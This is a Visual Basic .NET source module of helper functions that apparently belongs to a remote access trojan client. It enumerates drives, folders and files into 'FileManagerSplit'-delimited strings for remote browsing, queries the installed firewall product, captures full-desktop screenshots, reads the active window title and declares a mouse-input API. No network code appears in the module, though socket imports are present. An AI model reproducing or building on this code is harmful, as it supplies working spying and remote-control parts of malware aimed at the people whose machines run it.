Imports System.Diagnostics
Imports System.Management
Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32


Module Func
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives

            Select Case d.DriveType
                Case 2
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Function GetFirewall() As String
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        If str = "" Then
            str = "Not Found"
        End If
        Return str
        searcher.Dispose()
    End Function
    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
            Return FormatNumber(RAM_Size, 2)

        Catch : End Try
    End Function
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer

    Public Function CaptureDesktop() As Image
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function

    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Module
